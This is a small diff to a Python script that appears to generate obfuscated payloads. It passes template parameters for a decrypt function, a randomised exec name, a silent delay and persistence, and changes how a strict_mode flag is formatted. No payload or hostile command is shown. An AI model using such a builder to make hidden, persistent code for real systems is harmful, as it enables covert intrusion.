@@ -146,7 +146,7 @@ if __name__ == "__main__":
         decrypt_func=var_names['decrypt'],
         obfuscated_exec=''.join(random.choices(string.ascii_lowercase, k=10)),
         silent_delay=silent_delay,
-        strict_mode=str(strict_mode).lower(),
+        strict_mode=str(strict_mode),
         debug_code=debug_code,
         debug_exception=debug_exception,
         add_persistence=str(add_persistence).lower()
